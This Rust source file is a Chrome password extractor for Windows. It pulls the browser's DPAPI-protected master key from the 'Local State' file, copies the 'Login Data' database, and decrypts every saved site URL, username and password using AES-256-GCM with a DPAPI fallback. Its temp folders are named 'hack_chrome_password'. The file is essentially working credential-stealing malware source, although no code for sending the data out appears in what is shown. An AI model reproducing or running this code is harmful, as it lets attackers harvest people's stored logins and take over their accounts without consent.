use aes_gcm::aead::generic_array::GenericArray;
use aes_gcm::aead::Aead;
use aes_gcm::{Aes256Gcm, KeyInit};
use serde_json::from_str;
use tempdir::TempDir;
use winapi::um::dpapi::CryptUnprotectData;
use winapi::um::wincrypt::CRYPTOAPI_BLOB;

pub fn get_master_key(local_state_path: &std::path::PathBuf) -> Vec<u8> {
  let tmp_dir = TempDir::new("hack_chrome_password").unwrap();
  let tmp_local_state_path = tmp_dir.path().join("Local State");
  std::fs::copy(local_state_path, &tmp_local_state_path).unwrap();
  let content = std::fs::read_to_string(tmp_local_state_path).unwrap();
  tmp_dir.close().unwrap();
  let obj: serde_json::Value = from_str(&content).unwrap();
  let encrypted_key = obj["os_crypt"]["encrypted_key"].as_str().unwrap();
  let encrypted_key = base64::decode(encrypted_key).unwrap()[5..].to_vec();
  win32_crypt_unprotect_data(encrypted_key)
}

pub fn get_password(login_data_path: &std::path::PathBuf, key: &[u8]) -> Vec<Vec<String>> {
  let tmp_dir = TempDir::new("hack_chrome_pass").unwrap();
  let tmp_login_data_path = tmp_dir.path().join("Login Data");
  std::fs::copy(login_data_path, &tmp_login_data_path).unwrap();
  let conn = sqlite::Connection::open(tmp_login_data_path).unwrap();
  let query = "SELECT action_url, username_value, password_value FROM logins";
  let mut statement = conn.prepare(query).unwrap();
  let mut logins = Vec::new();
  while let sqlite::State::Row = statement.next().unwrap() {
    let url = statement.read::<String>(0).unwrap();
    let username = statement.read::<String>(1).unwrap();
    let password = statement.read::<Vec<u8>>(2).unwrap();
    let password = std::str::from_utf8(&aes_256_gcm_decrypt(key, password))
      .unwrap()
      .to_string();
    logins.push(vec![url, username, password]);
  }
  logins
}

pub fn aes_256_gcm_decrypt(key: &[u8], data: Vec<u8>) -> Vec<u8> {
  let key = GenericArray::from_slice(key);
  let cipher = Aes256Gcm::new(key);
  let nonce = GenericArray::from_slice(&data[3..15]);
  match cipher.decrypt(nonce, data[15..].as_ref()) {
    Ok(data) => data,                           // version > 80
    Err(_) => win32_crypt_unprotect_data(data), // version < 80
  }
}

/// Decrypts data using [`CryptUnprotectData`][1].
///
/// [1]: https://docs.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptunprotectdata
pub fn win32_crypt_unprotect_data(mut encrypted_key: Vec<u8>) -> Vec<u8> {
  let mut in_data = CRYPTOAPI_BLOB {
    cbData: encrypted_key.len() as u32,
    pbData: encrypted_key.as_mut_ptr(),
  };
  let mut out_data = CRYPTOAPI_BLOB {
    cbData: 0,
    pbData: std::ptr::null_mut(),
  };

  unsafe {
    CryptUnprotectData(
      &mut in_data,
      std::ptr::null_mut(),
      std::ptr::null_mut(),
      std::ptr::null_mut(),
      std::ptr::null_mut(),
      0,
      &mut out_data,
    );

    Vec::from_raw_parts(out_data.pbData, out_data.cbData as usize, out_data.cbData as usize)
  }
}
